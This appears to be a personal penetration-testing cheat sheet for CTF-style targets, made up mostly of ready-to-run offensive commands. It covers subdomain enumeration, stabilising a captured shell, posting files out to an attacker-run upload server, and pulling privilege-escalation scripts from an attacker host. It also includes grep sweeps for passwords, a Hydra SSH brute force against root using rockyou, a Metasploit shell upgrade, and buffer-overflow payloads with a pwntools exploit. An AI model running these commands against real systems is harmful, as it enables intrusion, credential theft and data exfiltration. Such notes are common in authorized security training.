# CHECK-LIST
- add ip and domain to /etc/hosts
- check website with zaproxy
- searchsploit for technologies used
- msfconsole search for technologies used
- search for alternatives to programs

# sub domain enum
amass enum -src -ip -passive -d <domain> -o output.txt
amass enum -src -ip -d <domain> -o output.txt
amass enum -src -ip -active -d <domain> -o output.txt
amass enum -d <domain> -active -brute -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt

# webservers
urlencode your shit
check if path traversal is possible
curl http://localhost:3000/~user/file

# Stable shell
1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. background; stty raw -echo; fg

# post file to updog
curl -v -XPOST -F "file=@/tmp/linenum.txt;filename=linenum.txt" -F "path=/home/kali" http://so.me.ip.at:9090/upload

# check files content
grep -r "password" / 2> /dev/null
grep -r "pass" / 2> /dev/null
grep -r "username" / 2> /dev/null
grep -r "user" / 2> /dev/null
grep -r "comm=\"su" /var/log/audit

# rev shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# download post files (linux)
http://0.0.0.0:9090/bin/LinEnum/LinEnum.sh
http://0.0.0.0:9090/bin/postenum/postenum.sh
http://0.0.0.0:9090/bin/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh

# Hydra ssh
hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ip -t 4 ssh

# Upgrade metasploit shell
use multi/manage/shell_to_meterpreter

# find docker files
find / -type f -name "*env"
find / -type f -name "Dockerfile"
find / -type f -name "*docker-compose*"

# download files curl
curl http://localhost:9090/file -o output.file

# bof python
python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'

from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()

# interesting files
find / -name "*user*" -not \( -path "/proc/*" -or -path "/sys/*" -or -path "/usr/share/icons/*" -or -path "/usr/share/man/*" -or -path "/usr/share/locale/*" -or -path "/usr/share/help/*" -or -path "/usr/src/linux-headers*"  -or -path "/usr/share/help-langpack/*" -or -path "/var/lib/dpkg/info/*" -or -path "/usr/share/doc/*" -or -path "/usr/share/locale-langpack/*" -or -path "/var/lib/app-info/icons/*" \) 2> /dev/null
find / -user <user>
find / -mtime -60 # find files with are modified in last 60 days
find / -perm 0777
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null # edit in last 5min
find / -newermt "2020-08-13" 2> /dev/null
